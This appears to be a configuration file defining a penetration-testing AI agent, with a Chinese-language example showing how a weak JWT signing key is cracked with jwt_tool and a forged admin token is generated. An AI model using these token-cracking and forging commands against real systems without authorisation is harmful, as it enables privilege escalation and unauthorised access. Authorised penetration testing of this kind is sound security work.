...
agent_name: Penetration Tester Agent
emoji: 🎯
layer: security
version: 1.0.0
status: active
...
tags: [penetration-testing, vulnerability-verification, attack-surface, exploitation]
dependencies: [security-auditor, architect, backend-developer]
outputs: [pentest-report, exploit-poc, attack-surface-analysis]
---
...
### 验证步骤
1. 获取JWT令牌: `curl -X POST /api/login -d '{"user":"admin"}'`
2. 分析令牌结构: Header.Payload.Signature
3. 尝试弱密钥破解: 使用 `jwt_tool` 爆破
4. 成功破解密钥: `secret123`

### 漏洞利用
```bash
# 生成管理员令牌
jwt_tool.py <token> -C -d secret123 -I -pc role -pv admin
```
